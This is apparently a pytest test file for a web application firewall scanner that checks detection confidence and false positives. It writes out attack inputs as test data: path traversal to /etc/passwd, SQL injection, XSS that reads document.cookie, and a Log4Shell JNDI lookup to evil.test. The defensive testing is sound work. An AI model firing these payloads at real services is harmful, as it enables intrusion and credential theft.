"""WAF 特徵掃描單元測試 — 純函式，不需 DB / Redis。"""

from __future__ import annotations

import pytest

from api.core.waf import scan_request


def _scan(path: str = "/", query: str = "", ua: str = "", referer: str = ""):
    return scan_request(path, query, ua, referer)


# ---- 高信心：應命中且為 high ----
@pytest.mark.parametrize(
    "path,query",
    [
        ("/wp-admin/setup-config.php", ""),
        ("/.env", ""),
        ("/.git/config", ""),
        ("/index.php", ""),
        ("/api/files", "name=../../../../etc/passwd"),
        ("/download", "f=..%2f..%2f..%2fetc%2fpasswd"),
        ("/search", "q=%00cmd"),
        ("/x", "p=${jndi:ldap://evil.test/a}"),
    ],
)
def test_high_confidence_hits(path: str, query: str) -> None:
    result = _scan(path=path, query=query)
    assert result is not None, f"expected hit for {path}?{query}"
    assert result[1] == "high"


# ---- 中信心：SQLi / XSS 特徵 ----
@pytest.mark.parametrize(
    "query",
    [
        "id=1 UNION SELECT password FROM users",
        "id=1' OR '1'='1",
        "q='; DROP TABLE users;--",
        "name=<script>alert(1)</script>",
        "next=javascript:alert(document.cookie)",
        "img=<img src=x onerror=alert(1)>",
    ],
)
def test_medium_confidence_hits(query: str) -> None:
    result = _scan(path="/search", query=query)
    assert result is not None, f"expected hit for {query}"
    assert result[1] == "medium"


# ---- 真實合法流量：不應誤判 ----
@pytest.mark.parametrize(
    "path,query",
    [
        ("/announcements", "page=1&size=20"),
        ("/documents/search", "q=會議紀錄&status=approved"),
        ("/orgs/123/members", "role=member"),
        ("/meetings", "from=2026-06-01&to=2026-06-30"),
        ("/users/me", ""),
        # 含 select/or 等英文字但非注入語法的正常查詢
        ("/search", "q=please select an option or two"),
        # 中文內含「union」字樣的正常標題
        ("/documents", "title=Student Union 學生會公告"),
    ],
)
def test_legitimate_traffic_not_flagged(path: str, query: str) -> None:
    assert _scan(path=path, query=query) is None, f"false positive on {path}?{query}"


def test_scanner_signature_in_query_does_not_false_positive_on_path_scope() -> None:
    # 掃描器規則只比對 path；query 含 .env 字樣（如搜尋關鍵字）不應命中。
    assert _scan(path="/search", query="q=how to use .env files") is None


def test_user_agent_jndi_is_caught() -> None:
    result = _scan(path="/", query="", ua="${jndi:ldap://evil.test/x}")
    assert result is not None and result[1] == "high"
